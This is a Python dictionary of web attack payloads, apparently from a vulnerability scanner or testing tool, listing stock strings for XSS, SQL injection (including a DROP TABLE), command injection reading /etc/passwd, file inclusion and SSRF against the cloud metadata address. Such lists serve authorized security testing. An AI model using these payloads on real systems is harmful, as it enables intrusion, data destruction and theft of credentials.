PAYLOADS = {
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "'\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>"
    ],
    "sqli": [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL, NULL, NULL --",
        "'; DROP TABLE users; --",
        "1' OR '1'='1' --"
    ],
    "command_injection": [
        "; ls",
        "| ls",
        "&& whoami",
        "$(whoami)",
        "; cat /etc/passwd"
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "....//....//....//etc/passwd"
    ],
    "ssrf": [
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd"
    ]
}


